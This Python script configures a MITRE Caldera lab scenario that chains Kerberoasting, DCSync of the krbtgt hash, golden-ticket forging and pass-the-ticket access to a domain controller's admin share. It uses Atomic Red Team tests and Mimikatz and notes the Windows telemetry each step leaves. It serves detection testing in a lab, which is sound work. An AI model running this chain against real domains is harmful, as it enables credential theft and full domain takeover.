#!/usr/bin/env python3
r"""
caldera_identity_setup.py
Hunt Lab identity-chain scenario:
  Kerberoasting -> DCSync -> Golden Ticket -> Pass-the-Ticket

POSTs 6 attack abilities + 2 dwell-time abilities and one adversary
"Identity-Chain-2025-Lab" into Caldera so it can be run against agent
group 'red' (the three Windows lab VMs).

This scenario is the identity-side counterpart to the endpoint-heavy
DFIR-RansomHub-2025-Lab adversary. Where RansomHub stresses Sysmon
process / file telemetry, this chain stresses 4769 (TGS), 4662 (DS
replication), and Mimikatz command-line patterns on the DC.

Skipped vs a real intrusion (out of scope for the lab):
  - External entry vector
  - Offline TGS cracking (we model it as a dwell ability instead — the
    detection of interest is the TGS *request*, not the crack)
  - Lateral exploitation of the impersonated account beyond proving
    the ticket works (`dir \\\\win-dc\\C$`)

Lab setup required for kerberoasting to work:
  svc-deploy must have a registered SPN. setup_dc_post_reboot.ps1
  registers `HTTP/finance.lab.local` on svc-deploy at DC provisioning
  time. If you cloned the repo before that change, run id-00-prep-spn
  manually in Caldera (targeting the win-dc agent), or run
  `setspn -A HTTP/finance.lab.local LAB\svc-deploy` on win-dc once.

Targeting (best to manually pick agents in the operation UI):
  id-00-prep-spn          win-dc      (only needs to run once)
  id-01-kerberoast        win-server  (any domain member; user-context)
  id-02-dcsync            win-dc      (SYSTEM on DC has replication rights)
  id-03-golden-ticket     win-server  (forge anywhere; SYSTEM is fine)
  id-04-pass-the-ticket   win-server  (use the ticket, hit DC's C$)
  id-05-cleanup           wherever 03/04 ran

Run by hand:
  python3 scripts/caldera_identity_setup.py

Then in Caldera UI: Operations -> New Operation -> Adversary
  "Identity-Chain-2025-Lab", Group "red", Start.
"""
import json
import os
import sys
import time
import urllib.error
import urllib.request

CALDERA = os.environ.get("CALDERA_URL", "http://192.168.56.10:8888").rstrip("/")
API_KEY = os.environ.get("CALDERA_API_KEY", "ADMIN123")
WAIT_SECONDS = int(os.environ.get("CALDERA_WAIT_SECONDS", "0"))

# Dwell durations baked into the chain so the operation models attacker
# idle time instead of running back-to-back. Default totals ~1.5 min.
ID_DWELL_CRACK = int(os.environ.get("ID_DWELL_CRACK", "60"))   # post-kerberoast: offline crack
ID_DWELL_LATER = int(os.environ.get("ID_DWELL_LATER", "30"))   # post-DCSync: pick a target

ADVERSARY_ID = "id-adversary-identity-chain-2025-lab"

ART = r"C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1"
ART_IMPORT = f"Import-Module '{ART}' -Force"


def api(method, path, body=None):
    url = CALDERA + path
    data = json.dumps(body).encode() if body else None
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header("KEY", API_KEY)
    if data:
        req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            return json.loads(r.read()), r.status
    except urllib.error.HTTPError as e:
        return {"error": e.read().decode()[:400]}, e.code
    except Exception as e:
        return {"error": str(e)}, 0


def upsert_ability(p):
    name, aid = p["name"], p["ability_id"]
    _, status = api("PUT", f"/api/v2/abilities/{aid}", p)
    if status in (200, 201):
        print(f"  OK  ability: {aid}  {name}")
        return True
    result, status = api("POST", "/api/v2/abilities", p)
    if status in (200, 201):
        print(f"  OK  ability: {aid}  {name}")
        return True
    print(f"  ERR ability: {aid}  HTTP {status}: {result}", file=sys.stderr)
    return False


def upsert_adversary(p):
    name, aid = p["name"], p["adversary_id"]
    _, status = api("PUT", f"/api/v2/adversaries/{aid}", p)
    if status in (200, 201):
        print(f"  OK  adversary: {aid}  {name}")
        return True
    result, status = api("POST", "/api/v2/adversaries", p)
    if status in (200, 201):
        print(f"  OK  adversary: {aid}  {name}")
        return True
    print(f"  ERR adversary: {aid}  HTTP {status}: {result}", file=sys.stderr)
    return False


def psh(command, timeout=180):
    return [{
        "name": "psh",
        "platform": "windows",
        "command": command,
        "timeout": timeout,
        "payloads": [],
        "uploads": [],
        "parsers": [],
        "cleanup": [],
        "variations": [],
    }]


def dwell_ability(ability_id, name, seconds, description):
    return {
        "ability_id": ability_id,
        "name": name,
        "description": description,
        "tactic": "command-and-control",
        "technique_name": "Scheduled Transfer",
        "technique_id": "T1029",
        "executors": psh(
            f"Write-Output ('[dwell] start ' + (Get-Date -Format o) + ' sleep={seconds}s'); "
            f"Start-Sleep -Seconds {seconds}; "
            f"Write-Output ('[dwell] end ' + (Get-Date -Format o))",
            timeout=seconds + 60,
        ),
        "requirements": [],
        "privilege": "",
        "repeatable": True,
        "singleton": False,
        "additional_info": {},
        "tags": ["hunt-lab", "identity-chain", "dwell"],
        "buckets": ["dwell"],
    }


# ── Abilities ────────────────────────────────────────────────────────────────
abilities = [
    {
        "ability_id": "id-00-prep-spn",
        "name": "ID: Register kerberoastable SPN on svc-deploy",
        "description": (
            "Idempotent prep step. Registers HTTP/finance.lab.local on the "
            "svc-deploy domain user so id-01-kerberoast has a TGS to request. "
            "setup_dc_post_reboot.ps1 also performs this at DC provisioning "
            "time; this ability is here so existing labs can self-heal "
            "without re-provisioning. Run on the win-dc agent (SYSTEM on a DC "
            "can modify SPNs via setspn)."
        ),
        "tactic": "persistence",
        "technique_name": "Domain Accounts",
        "technique_id": "T1078.002",
        "executors": psh(
            "$target = 'HTTP/finance.lab.local'; "
            "$existing = setspn -L LAB\\svc-deploy 2>$null; "
            "if ($existing -match [regex]::Escape($target)) { "
            "  Write-Output \"SPN $target already on svc-deploy - skipping\" "
            "} else { "
            "  setspn -A $target LAB\\svc-deploy; "
            "  if ($LASTEXITCODE -ne 0) { Write-Error 'setspn failed'; exit 1 }; "
            "  Write-Output \"Added SPN $target to svc-deploy\" "
            "}; "
            "setspn -L LAB\\svc-deploy",
            timeout=60,
        ),
        "requirements": [],
        "privilege": "Elevated",
        "repeatable": True,
        "singleton": False,
        "additional_info": {},
        "tags": ["hunt-lab", "identity-chain", "prep"],
        "buckets": ["persistence"],
    },
    {
        "ability_id": "id-01-kerberoast",
        "name": "ID: Kerberoast svc-deploy (Atomic T1558.003 Test 2)",
        "description": (
            "Atomic Red Team T1558.003 Test 2 — pure-PowerShell ADSI search "
            "for SPN-bearing accounts followed by KerberosRequestorSecurityToken "
            "TGS request. No external binaries, just .NET. The DC logs Win "
            "Event 4769 (TGS) for svc-deploy with EncType 0x17 (RC4) — that's "
            "the signal. Run from any domain member as a domain user; SYSTEM "
            "on a member won't work because there's no Kerberos context."
        ),
        "tactic": "credential-access",
        "technique_name": "Kerberoasting",
        "technique_id": "T1558.003",
        "executors": psh(
            f"{ART_IMPORT}; Invoke-AtomicTest T1558.003 -TestNumbers 2 -GetPrereqs; "
            "Invoke-AtomicTest T1558.003 -TestNumbers 2",
            timeout=240,
        ),
        "requirements": [],
        "privilege": "",
        "repeatable": True,
        "singleton": False,
        "additional_info": {},
        "tags": ["hunt-lab", "identity-chain", "credential-access", "atomic"],
        "buckets": ["credential-access"],
    },
    dwell_ability(
        "id-dwell-1-cracking",
        "ID: Dwell - offline TGS cracking",
        ID_DWELL_CRACK,
        "Models the attacker taking the captured TGS off-host to crack with "
        "hashcat. In real cases this is hours to days depending on the "
        "service-account password strength. Lab default is short. "
        f"Tunable via ID_DWELL_CRACK env var (current: {ID_DWELL_CRACK}s).",
    ),
    {
        "ability_id": "id-02-dcsync",
        "name": "ID: DCSync krbtgt (Atomic T1003.006 Test 1)",
        "description": (
            "Atomic Red Team T1003.006 Test 1 — Mimikatz lsadump::dcsync "
            "/user:krbtgt against the domain. -GetPrereqs pulls Mimikatz. "
            "**Run on the win-dc agent**: SYSTEM on a domain controller has "
            "the Replicating Directory Changes rights inherited via the DC "
            "computer account. Telemetry: Sysmon Event 1 with command line "
            "containing 'lsadump::dcsync'; on the DC, 4662 events for "
            "DS-Replication-Get-Changes (object GUID 1131f6aa-...). "
            "Hands the attacker the krbtgt NT hash for golden-ticket forging."
        ),
        "tactic": "credential-access",
        "technique_name": "DCSync",
        "technique_id": "T1003.006",
        "executors": psh(
            f"{ART_IMPORT}; Invoke-AtomicTest T1003.006 -TestNumbers 1 -GetPrereqs; "
            "Invoke-AtomicTest T1003.006 -TestNumbers 1",
            timeout=300,
        ),
        "requirements": [],
        "privilege": "Elevated",
        "repeatable": True,
        "singleton": False,
        "additional_info": {},
        "tags": ["hunt-lab", "identity-chain", "credential-access", "atomic"],
        "buckets": ["credential-access"],
    },
    dwell_ability(
        "id-dwell-2-target",
        "ID: Dwell - pick a forge target / wait out kerberos cache",
        ID_DWELL_LATER,
        "Models the attacker pausing after harvesting krbtgt to choose an "
        "impersonation target and stage tooling on a member host before "
        "forging the golden ticket. "
        f"Tunable via ID_DWELL_LATER env var (current: {ID_DWELL_LATER}s).",
    ),
    {
        "ability_id": "id-03-golden-ticket",
        "name": "ID: Forge golden ticket (Atomic T1558.001 Test 1)",
        "description": (
            "Atomic Red Team T1558.001 Test 1 — Mimikatz "
            "kerberos::golden forging a TGT for an arbitrary user (default "
            "Administrator) using the krbtgt hash. Run on a member host "
            "(win-server or win11-victim). Telemetry: Sysmon Event 1 with "
            "'kerberos::golden' in the command line, plus the canonical "
            "fake-PAC artefacts (10-year ticket lifetime, missing PAC fields)."
        ),
        "tactic": "credential-access",
        "technique_name": "Golden Ticket",
        "technique_id": "T1558.001",
        "executors": psh(
            f"{ART_IMPORT}; Invoke-AtomicTest T1558.001 -TestNumbers 1 -GetPrereqs; "
            "Invoke-AtomicTest T1558.001 -TestNumbers 1",
            timeout=240,
        ),
        "requirements": [],
        "privilege": "Elevated",
        "repeatable": True,
        "singleton": False,
        "additional_info": {},
        "tags": ["hunt-lab", "identity-chain", "credential-access", "atomic"],
        "buckets": ["credential-access"],
    },
    {
        "ability_id": "id-04-pass-the-ticket",
        "name": "ID: Pass the ticket + access DC C$ share",
        "description": (
            "Imports the forged ticket via Mimikatz kerberos::ptt, then proves "
            "it works by listing \\\\win-dc\\C$ — only Domain Admins can do "
            "that. Telemetry: command line 'kerberos::ptt'; klist showing the "
            "imported ticket; 4624 logon-as-Administrator on win-dc with weird "
            "ticket lifetime; SMB access to admin-only share."
        ),
        "tactic": "lateral-movement",
        "technique_name": "Pass the Ticket",
        "technique_id": "T1550.003",
        "executors": psh(
            f"{ART_IMPORT}; Invoke-AtomicTest T1550.003 -TestNumbers 1 -GetPrereqs; "
            "Invoke-AtomicTest T1550.003 -TestNumbers 1; "
            "Start-Sleep -Seconds 3; "
            "Write-Output '--- klist ---'; klist; "
            "Write-Output '--- DC C$ access test ---'; "
            "try { Get-ChildItem -Path '\\\\win-dc\\C$' -ErrorAction Stop "
            "  | Select-Object -First 5 | Format-Table Name,Length,LastWriteTime } "
            "catch { Write-Output ('access denied: ' + $_.Exception.Message) }",
            timeout=240,
        ),
        "requirements": [],
        "privilege": "",
        "repeatable": True,
        "singleton": False,
        "additional_info": {},
        "tags": ["hunt-lab", "identity-chain", "lateral-movement", "atomic"],
        "buckets": ["lateral-movement"],
    },
    {
        "ability_id": "id-05-cleanup",
        "name": "ID: Purge kerberos tickets (klist purge)",
        "description": (
            "kerberos::purge — wipes the forged ticket from the agent's "
            "session so the operation leaves a tidy lab. Detection-side, "
            "this also generates 'klist purge' command-line telemetry that "
            "is occasionally a useful weak signal."
        ),
        "tactic": "defense-evasion",
        "technique_name": "Indicator Removal",
        "technique_id": "T1070",
        "executors": psh(
            "klist purge; "
            "Write-Output '--- post-purge klist ---'; klist",
            timeout=60,
        ),
        "requirements": [],
        "privilege": "",
        "repeatable": True,
        "singleton": False,
        "additional_info": {},
        "tags": ["hunt-lab", "identity-chain", "defense-evasion"],
        "buckets": ["defense-evasion"],
    },
]


adversary = {
    "adversary_id": ADVERSARY_ID,
    "name": "Identity-Chain-2025-Lab",
    "description": (
        "Hunt Lab identity-side scenario: Kerberoasting -> DCSync -> Golden "
        "Ticket -> Pass-the-Ticket. Stresses 4769 RC4 TGS, 4662 replication, "
        "and Mimikatz command-line telemetry. Counterpart to the endpoint-"
        "heavy DFIR-RansomHub-2025-Lab adversary. Run against group 'red'; "
        "manually target the win-dc agent for id-00-prep-spn and id-02-dcsync, "
        "win-server (or win11-victim) for the rest."
    ),
    "atomic_ordering": [a["ability_id"] for a in abilities],
    "tags": ["hunt-lab", "identity-chain", "kerberos", "2025"],
}


def wait_for_caldera(max_seconds):
    if max_seconds <= 0:
        return True
    deadline = time.time() + max_seconds
    print(f"=== Waiting up to {max_seconds}s for Caldera at {CALDERA} ===")
    while time.time() < deadline:
        try:
            req = urllib.request.Request(CALDERA + "/api/v2/health")
            req.add_header("KEY", API_KEY)
            with urllib.request.urlopen(req, timeout=5) as r:
                if r.status == 200:
                    print(f"  Caldera ready.")
                    return True
        except Exception:
            pass
        time.sleep(5)
    print(f"  WARNING: Caldera not ready after {max_seconds}s — attempting anyway", file=sys.stderr)
    return False


if __name__ == "__main__":
    wait_for_caldera(WAIT_SECONDS)
    print(f"=== Identity chain: pushing abilities to Caldera at {CALDERA} ===")
    ok = True
    for a in abilities:
        ok &= upsert_ability(a)
    print()
    print("=== Pushing adversary ===")
    ok &= upsert_adversary(adversary)
    print()
    if ok:
        print("Done.")
        print()
        print("Targeting hints (set per-ability in the Caldera operation UI):")
        print("  id-00-prep-spn       -> win-dc")
        print("  id-01-kerberoast     -> win-server")
        print("  id-02-dcsync         -> win-dc")
        print("  id-03-golden-ticket  -> win-server")
        print("  id-04-pass-the-ticket -> win-server")
        print("  id-05-cleanup        -> win-server")
        print()
        print(f"  Caldera: {CALDERA}  (admin / admin)")
    else:
        print("Some objects failed - see errors above.", file=sys.stderr)
        sys.exit(1)
